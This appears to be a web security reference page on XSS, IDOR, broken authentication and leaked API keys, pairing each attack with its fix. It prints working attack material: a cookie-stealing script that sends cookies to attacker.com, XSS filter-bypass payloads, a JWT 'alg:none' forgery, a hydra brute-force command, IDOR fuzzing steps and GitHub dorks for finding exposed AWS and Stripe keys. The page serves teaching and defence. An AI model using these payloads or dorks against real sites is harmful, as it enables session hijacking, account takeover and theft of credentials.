🔍 Cross-Site Scripting (XSS)
CWE-79 • Reflected / Stored / DOM-based • OWASP A03:2021
Medium ⌄

XSS lets an attacker inject JavaScript into pages seen by other users. The browser trusts the page origin and executes the script with full DOM access — stealing cookies, hijacking sessions, or defacing sites.

Reflected XSS
Payload is in the URL/query parameter and is reflected immediately in the response. Requires victim to click a crafted link.
Stored XSS
Payload is saved in the database (comment, profile, post) and fires for every user who visits the page — most dangerous.
DOM-based XSS
JavaScript reads attacker-controlled input (URL hash, localStorage) and writes it to the DOM without server involvement.
Blind XSS
Payload fires in admin panels or log viewers that the attacker can't see directly — use XSS Hunter to capture callbacks.
Cookie theft (session hijack)
<script> document.location = 'https://attacker.com/steal?c=' + document.cookie; </script>
Bypass when <script> is filtered
// Using event handler attributes: " autofocus onfocus="alert(document.domain) // SVG-based bypass: <svg onload=alert(1)> // IMG onerror: <img src=x onerror=alert(document.cookie)>
DOM XSS sink
// Vulnerable JS — never do this: const name = location.hash.slice(1); document.getElementById('greeting').innerHTML = name; // ← XSS sink // Attack URL: https://target.com/page#<img src=x onerror=alert(1)>
✅
Primary fix: Output-encode all user-controlled data before inserting into HTML. Use framework auto-escaping (React JSX, Angular templates, Django templates) — never raw innerHTML.
// WRONG — vulnerable: element.innerHTML = userInput; // RIGHT — safe alternatives: element.textContent = userInput; // plain text, no HTML parsed element.setAttribute('value', userInput); // attribute context // Content Security Policy header: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'; // Cookie flags — stop JS reading session cookie: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict

👤 IDOR — Insecure Direct Object Reference
CWE-639 • Broken Access Control • OWASP A01:2021
Medium–High ⌄

When an app uses user-supplied IDs to fetch objects without checking ownership. Changing user_id=123 to user_id=124 returns another user's private data.

Vulnerable API request
GET /api/v1/orders/7821 Authorization: Bearer eyJhbGci... → Returns order belonging to user 7821 — not the caller. Server never checks: does the caller OWN order 7821?
Exploit — ID fuzzing with Burp Intruder
# Step 1 — Intercept a valid request in Burp Suite # Step 2 — Send to Intruder, mark the ID as payload position GET /api/v1/orders/§7821§ # Step 3 — Number payload: 7800 → 7900 # Step 4 — Filter results: 200 OK = data found, 403/404 = not found # Step 5 — Stop immediately when you confirm access to another user's data
UUID IDOR — still vulnerable
# Even GUIDs can be IDOR if the server doesn't verify ownership: GET /docs/3f2504e0-4f89-11d3-9a0c-0305e82c3301 # If you find a GUID in another user's shared link → test it with your token
Defense
// Server-side ownership check — ALWAYS required: const order = await Order.findById(req.params.id); if (order.userId !== req.user.id) { return res.status(403).json({ error: 'Forbidden' }); // ✓ } // Or use scoped queries — never return what you haven't filtered: const order = await Order.findOne({ _id: req.params.id, userId: req.user.id });

🔓 Broken Authentication
CWE-287 • JWT flaws, session fixation, brute-force • OWASP A07:2021
High ⌄

Flaws in login flows, session tokens, or JWT handling let attackers assume other users' identities without knowing their passwords.

# JWT "alg:none" attack — library accepts unsigned token: # Original JWT header: { "alg": "HS256", "typ": "JWT" } # Attacker changes to: { "alg": "none", "typ": "JWT" } # With modified payload (admin escalation): { "user": "alice", "role": "admin", "exp": 9999999999 } # Remove signature entirely → some libraries accept as valid! eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD.
# Fix — always enforce algorithm server-side: const payload = jwt.verify(token, secret, { algorithms: ['HS256'] // ← explicitly whitelist, never allow 'none' });
# Credential stuffing / brute-force (authorized lab only): hydra -L users.txt -P rockyou.txt \ https-post-form \ "/login:username=^USER^&password=^PASS^:Invalid credentials" \ -t 16 -f # Rate-limit test — check if lockout triggers: for i in {1..20}; do curl -s -o /dev/null -w "%{http_code}\n" \ -X POST https://target.lab/login \ -d "username=admin&password=wrong$i" done # If all return 200 or 401 without 429 — no rate limiting
# Session fixation — attacker forces a known session ID: # 1. Attacker gets a pre-auth session: GET /login → Set-Cookie: SESSID=attacker_known_value # 2. Tricks victim into using that session (link with cookie set) # 3. After victim logs in, SESSID is still attacker_known_value # 4. Attacker uses same SESSID → authenticated as victim # Fix — regenerate session ID after login: req.session.regenerate(() => { // ← must do this on login req.session.user = authenticatedUser; });
🔑 Exposed API Keys
CWE-312 • Secret leakage in Git repos / JS bundles • OWASP A02:2021
Medium–High ⌄

API secrets pushed to public GitHub repos or embedded in frontend JS are scraped by bots within seconds of publication. AWS access keys leaked this way have led to $50,000+ cloud bills within hours.

Scan your own repos with TruffleHog
# Install: pip install trufflehog3 # Scan your repo (only run on repos you own): trufflehog git https://github.com/YOUR_ORG/YOUR_REPO --only-verified # Check git history — deleted files remain in commits: git log --all -p | grep -iE "api_key|secret|password|token|aws" # GitLeaks (faster, more patterns): gitleaks detect --source . --verbose
GitHub dork — find leaks in public repos (OSINT research)
# AWS Access Key ID always starts with AKIA: "AKIA" filename:.env # Stripe live keys: "sk_live_" extension:js # Generic secret patterns: filename:.env DB_PASSWORD filename:config.php password
If you find a leaked key — what to do
1
Immediately rotate / revoke the key
In AWS: IAM → Security credentials → Deactivate. Assume it was already used by bots.
2
Check access logs for unauthorized usage
AWS CloudTrail, GCP Audit Logs, Stripe dashboard — look for unusual API calls or resource creation.
3
Remove from git history and prevent recurrence
Use git filter-repo to purge history. Add pre-commit hooks with detect-secrets. Enable GitHub Push Protection.
# Prevent future leaks — pre-commit hook: pip install detect-secrets detect-secrets scan > .secrets.baseline pre-commit install # .env pattern in .gitignore: .env .env.* *.pem *_key.json credentials.json
